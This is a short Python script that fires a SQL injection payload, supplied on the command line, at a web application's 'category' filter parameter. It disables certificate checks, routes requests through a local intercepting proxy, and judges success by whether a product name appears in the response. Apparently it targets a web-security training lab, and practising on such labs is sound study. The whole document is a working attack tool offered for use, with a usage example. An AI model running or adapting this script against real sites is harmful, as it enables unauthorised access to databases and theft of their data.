import sys
import requests
import urllib3


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxy = {"http": "http://127.0.0.1:8800", "https": "http://127.0.0.1:8800"}


def exploit_sql_injection(url, payload):
    uri = "/filter?category="
    r = requests.get(url + uri + payload, verify=False, proxies=proxy)
    if  "Sarcastic 9 Ball" in r.text:
        return True
    return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url> <payload> ")
        print(f"[-] Example: {sys.argv[0]} www.example.com '1=1'")
        sys.exit(-1)

    if exploit_sql_injection(url, payload):
        print("[+] SQL injections succesful")
    else:
        print("[-] SQL injections unsucesful")
